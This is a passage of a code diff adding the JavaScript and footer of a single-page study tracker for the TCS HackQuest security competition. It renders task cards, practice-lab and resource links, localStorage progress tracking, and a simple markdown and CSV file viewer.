+                                        <div style="margin-top: 15px;">
+                                            <h4 style="font-size: 14px; color: var(--primary); margin-bottom: 10px;">🧪 Practice Labs</h4>
+                                            <div class="practice-labs">
+                                                ${task.labs.map(lab => `
+                                                    <div class="lab-card" onclick="window.open('${lab.url}', '_blank')">
+                                                        <h5>${lab.name}</h5>
+                                                        <p>${lab.challenges} challenges</p>
+                                                        <span class="lab-difficulty ${lab.difficulty}">${lab.difficulty}</span>
+                                                    </div>
+                                                `).join('')}
+                                            </div>
+                                        </div>
+                                    ` : ''}
+
+                                    ${task.pyqChallenges ? `
+                                        <div style="margin-top: 15px;">
+                                            <h4 style="font-size: 14px; color: var(--warning); margin-bottom: 10px;">📝 Previous Year Questions</h4>
+                                            ${task.pyqChallenges.map(pyq => `
+                                                <div style="background: rgba(168,75,47,0.1); padding: 10px; border-radius: 6px; margin-bottom: 8px;">
+                                                    <strong>${pyq.name}</strong> - ${pyq.points} pts | ${pyq.category} ${pyq.season ? `| Season ${pyq.season}` : ''}
+                                                </div>
+                                            `).join('')}
+                                        </div>
+                                    ` : ''}
+
+                                    <div class="task-meta">
+                                        <span class="meta-tag">⏱️ ${task.time}</span>
+                                        <span class="meta-tag">📊 ${task.difficulty}</span>
+                                    </div>
+                                    
+                                    ${task.resources ? `
+                                        <div class="resource-links">
+                                            ${task.resources.map(res => {
+                                                const isViewable = res.type === 'markdown' || res.type === 'csv';
+                                                const icon = res.type === 'pdf' ? '📄' : res.type === 'markdown' ? '📝' : res.type === 'csv' ? '📊' : res.type === 'lab' ? '🧪' : res.type === 'tool' ? '🔧' : '🔗';
+                                                
+                                                if (isViewable) {
+                                                    return `
+                                                        <a href="#" class="resource-link secondary" 
+                                                           onclick="event.preventDefault(); openFileViewer('${res.url}', '${res.name}', '${res.type}')">
+                                                            ${icon} ${res.name}
+                                                            ${res.pages ? `<span style="font-size: 11px; opacity: 0.8;"> - ${res.pages}</span>` : ''}
+                                                        </a>
+                                                    `;
+                                                } else {
+                                                    return `
+                                                        <a href="${res.url}" class="resource-link ${res.type === 'pdf' ? '' : 'secondary'}" 
+                                                           target="_blank">
+                                                            ${icon} ${res.name}
+                                                            ${res.pages ? `<span style="font-size: 11px; opacity: 0.8;"> - ${res.pages}</span>` : ''}
+                                                        </a>
+                                                    `;
+                                                }
+                                            }).join('')}
+                                        </div>
+                                    ` : ''}
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
+
+            container.innerHTML = html;
+        }
+
+        function toggleTask(taskId, isChecked) {
+            if (isChecked) {
+                if (!progressData.completedTasks.includes(taskId)) {
+                    progressData.completedTasks.push(taskId);
+                }
+            } else {
+                progressData.completedTasks = progressData.completedTasks.filter(id => id !== taskId);
+            }
+            
+            localStorage.setItem('tcsHackquestProgress', JSON.stringify(progressData));
+            updateProgress();
+        }
+
+        function updateProgress() {
+            const totalTasks = Object.values(trainingData).reduce((sum, day) => sum + day.tasks.length, 0);
+            const completed = progressData.completedTasks.length;
+            const percentage = Math.round((completed / totalTasks) * 100);
+
+            document.getElementById('overallProgress').style.width = percentage + '%';
+            document.getElementById('overallProgress').textContent = percentage + '%';
+            document.getElementById('completedTasks').textContent = completed;
+            document.getElementById('totalTasks').textContent = totalTasks;
+            document.getElementById('completedDays').textContent = progressData.completedDays.length;
+            
+            const estimatedHours = completed * 0.75;
+            document.getElementById('hoursSpent').textContent = Math.round(estimatedHours);
+        }
+
+        function openResourcesModal() {
+            document.getElementById('resourcesModal').classList.add('active');
+        }
+
+        function openProgressModal() {
+            const modal = document.getElementById('progressModal');
+            const container = document.getElementById('detailedProgress');
+            
+            let html = '';
+            Object.entries(trainingData).forEach(([dayKey, day], index) => {
+                const dayTasks = day.tasks;
+                const completedInDay = dayTasks.filter(t => progressData.completedTasks.includes(t.id)).length;
+                const dayProgress = Math.round((completedInDay / dayTasks.length) * 100);
+                
+                html += `
+                    <div style="margin-bottom: 20px;">
+                        <h3 style="font-size: 16px; margin-bottom: 10px;">Day ${index + 1}: ${day.title}</h3>
+                        <div class="progress-bar-container" style="height: 25px;">
+                            <div class="progress-bar" style="width: ${dayProgress}%">${dayProgress}%</div>
+                        </div>
+                        <p style="font-size: 13px; color: var(--text-secondary); margin-top: 5px;">
+                            ${completedInDay} / ${dayTasks.length} tasks completed
+                        </p>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+            modal.classList.add('active');
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+        }
+
+        function resetProgress() {
+            if (confirm('Are you sure you want to reset all progress? This cannot be undone.')) {
+                localStorage.removeItem('tcsHackquestProgress');
+                location.reload();
+            }
+        }
+
+        function generateResourcesList() {
+            const container = document.getElementById('allResourcesList');
+            const resources = [
+                { name: 'Previous Years Solutions (31 pages)', url: 'PDFs/TCS-HackQuest-Previous-Years-Solutions.pdf', type: 'PDF', fileType: 'pdf', desc: 'Actual challenges from Seasons 5, 7, 8 with solutions' },
+                { name: 'Complete Preparation Guide (25 pages)', url: 'PDFs/TCS-HackQuest-Complete-Preparation-Guide.pdf', type: 'PDF', fileType: 'pdf', desc: 'Comprehensive learning resource for all categories' },
+                { name: 'Mock Challenges Walkthrough (20 pages)', url: 'PDFs/TCS-HackQuest-Mock-Challenges-Walkthrough.pdf', type: 'PDF', fileType: 'pdf', desc: '30 realistic practice challenges with solutions' },
+                { name: 'Phase-by-Phase Guide (23 pages)', url: 'PDFs/TCS-HackQuest-Phase-by-Phase-Guide.pdf', type: 'PDF', fileType: 'pdf', desc: 'Competition day strategy for Rounds 1, 2, 3' },
+                { name: '50 Practice Problems (16 pages)', url: 'PDFs/TCS-HackQuest-50-Practice-Problems.pdf', type: 'PDF', fileType: 'pdf', desc: 'Additional problems across all categories' },
+                { name: 'TCS HackQuest Questions (full dump)', url: 'PDFs/TCS-HackQuest-Questions.pdf', type: 'PDF', fileType: 'pdf', desc: 'Complete question bank with challenge names and statements' },
+                { name: 'macOS Setup Guide', url: 'Guides/macos_security_setup_guide.md', type: 'Guide', fileType: 'markdown', desc: 'Complete environment setup instructions' },
+                { name: 'Report Template', url: 'Templates/tcs_hackquest_report_template.md', type: 'Template', fileType: 'markdown', desc: 'Professional CTF report format' },
+                { name: 'Cheatsheet Template', url: 'Templates/tcs_hackquest_cheatsheet.md', type: 'Template', fileType: 'markdown', desc: 'Quick command reference' },
+                { name: '10-Day Plan CSV', url: 'Guides/tcs_hackquest_10day_plan.csv', type: 'CSV', fileType: 'csv', desc: 'Spreadsheet version of schedule' }
+            ];
+
+            let html = '<div style="display: flex; flex-direction: column; gap: 15px;">';
+            html += '<p style="color: var(--text-secondary); margin-bottom: 15px;">Click on markdown/CSV files to view them directly in the app!</p>';
+            resources.forEach(res => {
+                const isViewable = res.fileType === 'markdown' || res.fileType === 'csv';
+                html += `
+                    <div class="pdf-preview">
+                        <h4>${res.name}</h4>
+                        <p style="font-size: 12px; color: var(--text-secondary); margin: 5px 0;">${res.desc}</p>
+                        <p style="font-size: 11px; opacity: 0.7;">${res.type}</p>
+                        ${isViewable ? `
+                            <a href="#" class="resource-link secondary" onclick="event.preventDefault(); openFileViewer('${res.url}', '${res.name}', '${res.fileType}')">
+                                ${res.type === 'CSV' ? '📊' : '📝'} View ${res.type}
+                            </a>
+                        ` : `
+                            <a href="${res.url}" class="resource-link" target="_blank">
+                                📄 Open ${res.type}
+                            </a>
+                        `}
+                    </div>
+                `;
+            });
+            html += '</div>';
+            
+            container.innerHTML = html;
+        }
+
+        async function openFileViewer(url, fileName, fileType) {
+            const modal = document.getElementById('fileViewerModal');
+            const title = document.getElementById('fileViewerTitle');
+            const content = document.getElementById('fileViewerContent');
+            
+            title.textContent = `📄 ${fileName}`;
+            content.innerHTML = '<div class="file-viewer-loading">Loading file...</div>';
+            modal.classList.add('active');
+            
+            try {
+                const response = await fetch(url);
+                if (!response.ok) throw new Error('File not found');
+                
+                const text = await response.text();
+                
+                if (fileType === 'markdown') {
+                    content.innerHTML = `<div class="markdown-content">${parseMarkdown(text)}</div>`;
+                } else if (fileType === 'csv') {
+                    content.innerHTML = parseCSV(text);
+                }
+            } catch (error) {
+                content.innerHTML = `
+                    <div class="file-viewer-error">
+                        <h3>Error Loading File</h3>
+                        <p>Could not load <strong>${fileName}</strong></p>
+                        <p style="font-size: 13px; margin-top: 10px;">Make sure the file exists at: <code>${url}</code></p>
+                        <p style="font-size: 13px; margin-top: 10px;">Download the complete package with all files organized in proper folders.</p>
+                    </div>
+                `;
+            }
+        }
+
+        function parseMarkdown(markdown) {
+            let html = markdown;
+            
+            // Headers
+            html = html.replace(/^#### (.*$)/gim, '<h4>$1</h4>');
+            html = html.replace(/^### (.*$)/gim, '<h3>$1</h3>');
+            html = html.replace(/^## (.*$)/gim, '<h2>$1</h2>');
+            html = html.replace(/^# (.*$)/gim, '<h1>$1</h1>');
+            
+            // Bold
+            html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
+            
+            // Italic
+            html = html.replace(/\*(.*?)\*/g, '<em>$1</em>');
+            
+            // Code blocks
+            html = html.replace(/```(\w+)?\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>');
+            
+            // Inline code
+            html = html.replace(/`([^`]+)`/g, '<code>$1</code>');
+            
+            // Links
+            html = html.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank">$1</a>');
+            
+            // Unordered lists
+            html = html.replace(/^\s*[-*+]\s+(.*)$/gim, '<li>$1</li>');
+            html = html.replace(/(<li>.*<\/li>)/s, '<ul>$1</ul>');
+            
+            // Ordered lists
+            html = html.replace(/^\s*\d+\.\s+(.*)$/gim, '<li>$1</li>');
+            
+            // Blockquotes
+            html = html.replace(/^\> (.*)$/gim, '<blockquote>$1</blockquote>');
+            
+            // Horizontal rules
+            html = html.replace(/^\-\-\-$/gim, '<hr>');
+            
+            // Paragraphs
+            html = html.split('\n\n').map(para => {
+                if (!para.match(/^<[huplob]/)) {
+                    return '<p>' + para + '</p>';
+                }
+                return para;
+            }).join('\n');
+            
+            return html;
+        }
+
+        function parseCSV(csvText) {
+            const lines = csvText.trim().split('\n');
+            const headers = lines[0].split(',').map(h => h.trim());
+            const rows = lines.slice(1).map(line => line.split(',').map(cell => cell.trim()));
+            
+            let html = '<table class="csv-table">';
+            html += '<thead><tr>';
+            headers.forEach(header => {
+                html += `<th>${header}</th>`;
+            });
+            html += '</tr></thead><tbody>';
+            
+            rows.forEach(row => {
+                html += '<tr>';
+                row.forEach(cell => {
+                    html += `<td>${cell}</td>`;
+                });
+                html += '</tr>';
+            });
+            
+            html += '</tbody></table>';
+            return html;
+        }
+
+        window.onclick = function(event) {
+            if (event.target.classList.contains('modal')) {
+                event.target.classList.remove('active');
+            }
+        }
+
+        initializeApp();
+    </script>
+
+    <footer style="text-align: center; margin: 40px 0 20px 0; padding: 20px 0; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 14px;">
+        Created by 
+        <a href="https://github.com/psypherion" target="_blank" rel="noopener noreferrer" style="color: var(--primary); text-decoration: none; font-weight: 600; border-bottom: 1px solid transparent; transition: border-color 0.3s;">
+            psypherion
+        </a>
+    </footer>
+</body>
+</html>
+
